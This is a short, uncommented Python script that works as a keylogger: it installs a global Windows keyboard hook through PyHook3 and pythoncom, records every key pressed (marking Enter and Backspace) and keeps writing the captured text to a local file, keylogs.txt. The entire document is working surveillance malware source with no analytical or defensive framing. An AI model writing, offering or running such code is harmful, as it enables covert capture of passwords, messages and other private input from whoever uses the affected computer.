import pythoncom, PyHook3

def keypressed(event):
        global store
        if event.Ascii == 13:
                keys = ' < Enter > '
        elif event.Ascii == 8:
                keys = ' <BACK SPACE> '
        else:
                keys = chr(event.Ascii)

        store = store + keys

        fp = open('keylogs.txt', 'w')
        fp.write(store)
        fp.close()
        return True

store = ''
obj = PyHook3.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
